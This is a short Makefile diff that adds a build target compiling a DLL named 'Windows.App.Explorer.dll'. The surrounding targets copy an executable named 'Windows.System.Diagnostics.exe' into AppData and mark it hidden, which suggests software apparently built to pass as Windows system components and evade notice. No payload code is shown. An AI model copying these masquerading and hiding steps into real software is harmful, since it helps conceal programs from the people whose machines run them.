@@ -10,6 +10,8 @@ SRC_ENV = stdlib/ICU_env.c
 SRC_PACKET = stdlib/ICU_packet.c
 SRC_WIN_REESTR = process/windowsprocess.c
 
+SRC_DLL = process/DLL/DLL_explorer.c
+
 MAIN_OUT = "$(OUT_DIR)/Windows.System.Diagnostics.exe"
 APPDATA_OUT = $(APPDATA_DIR)
 
@@ -33,6 +35,10 @@ appdata_c:
 	attrib +h "$(APPDATA_OUT)\Windows.System.Diagnostics.exe"
 appdata_d:
 	del /Q "$(APPDATA_OUT)\Windows.System.Diagnostics.exe"
+
+dll:
+	@if not exist $(OUT_DIR) mkdir $(OUT_DIR)
+	$(CC) -shared -o $(OUT_DIR)/Windows.App.Explorer.dll $(SRC_DLL) -Wall -Wextra $(LDFLAGS)
 
 clean:
 	rm -f $(EXE_OUT) $(DLL_OUT)
